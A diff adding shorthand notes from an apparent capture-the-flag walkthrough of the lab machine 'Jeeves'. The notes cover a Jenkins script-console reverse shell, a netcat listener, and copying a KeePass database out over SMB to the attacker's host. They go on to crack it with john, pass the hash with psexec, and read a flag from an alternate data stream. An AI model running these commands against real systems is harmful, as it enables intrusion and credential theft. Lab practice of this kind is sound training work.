@@ -1,5 +1,24 @@
 ```
 nmap -sS -sC -sV -T5 -Pn 10.10.10.63
+http://10.10.10.63:50000/
+Jetty 9.4.z-SNAPSHOT
+http://10.10.10.63:50000/askjeeves/
+Script Console - https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76#file-revsh-groovy
+nc -lnvp 1234
+C:\Users\kohsuke\Documents - CEH.kdbx
+./smbserver.py s . -smb2support -username df -password df
+net use \\10.10.14.6\s /u:df df
+copy CEH.kdbx \\10.10.14.6\s\CEH.kdbx
+keepass2john CEH.kdbx > hash.txt
+john hash.txt -w=/usr/share/wordlists/rockyou.txt
+keepassxc - Backup stuff
+./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63
+dir /r
+powershell Get-Content -Path "hm.txt" -Stream "root.txt"
+```
+
+```
+nmap -sS -sC -sV -T5 -Pn 10.10.10.63
 ```
 ![image](https://github.com/user-attachments/assets/d6384270-9642-4d95-8b0d-c23bf27eaf3a)
 
